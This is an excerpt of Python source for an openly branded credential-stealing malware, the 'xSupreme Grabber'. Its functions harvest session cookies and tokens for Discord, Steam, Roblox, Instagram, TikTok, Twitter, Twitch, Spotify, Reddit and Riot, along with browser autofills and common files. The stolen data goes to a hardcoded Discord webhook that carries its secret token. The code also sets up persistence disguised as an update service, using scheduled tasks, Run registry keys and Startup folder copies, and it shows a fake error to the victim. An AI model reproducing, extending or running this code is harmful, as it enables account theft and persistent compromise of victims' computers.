...
webhook = 'https://discordapp.com/api/webhooks/1365607050331295805/YjeDnRnuIUryYj80dCrViJDMLoZR8XsttHmyI74dTjnWQYeT7DGw3YoS9U4g46yQAVDL'
...
class Main:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://discord.gg/nRyBgWgfaU\n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***xSupreme Grabber***",
                    "description": f"***xSupreme Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://discord.gg/nRyBgWgfaU",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/nRyBgWgfaUm | https://github.com/mshrindustries"},
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Instagram Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": pp}
            }
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Tiktok Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Twitter Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Twitch Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Spotify Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": "https://cdn.discordapp..png"}}
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Reddit Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***xSupreme Grabber***",
                    "description": f"***xSupreme Roblox Session was detected on the {browser} browser***",
                    "url" : "https://discord.gg/nRyBgWgfaU",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                    "thumbnail": {"url": pp}
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***xSupreme Grabber***",
                "description": f"***xSupreme Validated Discord Token Detected***",
                "url" : "https://discord.gg/nRyBgWgfaU",
                "color": 0,
                "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
                "thumbnail": {"url": ""}}
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***xSupreme Grabber***",
                                    "description": f"***xSupreme Steam Session Detected***",
                                    "url" : "https://github.com/mshrindustries",
                                    "color": 0,
                                    "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
        ...
        try:
            ...
            if self.FirefoxAutofiList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.mew/xSupreme----------------------\n"+ "=" * 70 + "\n")
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***xSupreme Grabber***",
            "description": f"***xSupreme Grabber Full Info***",
            "url" : "https://discord.gg/nRyBgWgfaU",
            "color": 0,
            "footer": {"text": "https://discord.gg/nRyBgWgfaU | https://github.com/mshrindustries"},
            "thumbnail": {"url": "https://cdn.discordapp..png"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByxSupreme")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "xSupremeUpdateService", "xSupreme.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("xSupreme.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "xSupremeUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "xSupremeUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "xSupremeUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "xSupremeUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "xSupremeUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "xSupreme Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "xSupreme Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\xSupreme.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\xSupreme.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "xSupreme.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "xSupreme.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "xSupremeUpdateService", "xSupreme.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("xSupreme | Grabber | on top |"):
        ...
        print("just Windows Operating system's supported by xSupreme")
